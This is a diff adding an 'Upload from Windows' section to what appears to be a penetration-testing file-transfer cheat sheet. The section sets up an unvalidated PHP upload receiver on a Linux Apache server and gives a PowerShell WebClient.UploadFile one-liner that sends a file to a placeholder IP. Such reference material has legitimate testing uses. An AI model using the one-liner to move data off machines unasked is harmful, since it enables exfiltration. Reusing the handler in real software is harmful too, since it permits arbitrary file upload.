@@ -828,6 +828,43 @@ layout: default
             </td>
         </tr>
     </table>
+
+    <li>Upload from Windows</li>
+    <table>
+        <tr>
+            <td>Upload to Linux web server</td>
+            <td>
+                <table>
+                    <tr>
+                        <td>Upload server creation</td>
+                        <td>
+                            <table>
+                                <tr>
+                                    <td>Create upload.php in /var/www/html</td>
+                                    <td><pre>&lt;?php&#13;&#10;$uploaddir = &apos;/var/www/uploads/&apos;;&#13;&#10;$uploadfile = $uploaddir . $_FILES[&apos;file&apos;][&apos;name&apos;];&#13;&#10;move_uploaded_file($_FILES[&apos;file&apos;][&apos;tmp_name&apos;], $uploadfile)&#13;&#10;?&gt;</pre></td>
+                                </tr>
+                                <tr>
+                                    <td>Create directory to upload to</td>
+                                    <td>
+                                        <li>mkdir /var/www/uploads</li>
+                                        <li>sudo chown www-data: /var/www/uploads</li>
+                                    </td>
+                                </tr>
+                                <tr>
+                                    <td>Start web server</td>
+                                    <td>sudo systemctl start apache2</td>
+                                </tr>
+                            </table>
+                        </td>
+                    </tr>
+                </table>
+            </td>
+        </tr>
+        <tr>
+            <td>Upload file</td>
+            <td>powershell (New-Object System.Net.WebClient).UploadFile(&apos;http://&lt;ip address&gt;/upload.php&apos;, &apos;&lt;file&gt;&apos;)</td>
+        </tr>
+    </table>
     
     <hr>
     
